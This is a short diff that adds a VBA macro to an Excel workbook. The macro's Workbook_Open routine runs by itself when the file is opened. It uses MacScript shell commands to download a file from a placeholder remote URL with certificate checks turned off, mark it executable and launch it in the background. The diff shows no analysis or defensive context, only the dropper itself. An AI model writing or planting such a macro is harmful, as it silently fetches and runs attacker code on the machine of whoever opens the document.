@@ -1,0 +1,5 @@
+Sub Workbook_Open()
+MacScript("do shell script ""curl -k REMOTE_PAYLOAD_URL -o operator-payload"" ")
+MacScript("do shell script ""chmod +x operator-payload""")
+MacScript("do shell script ""./operator-payload &""")
+End Sub
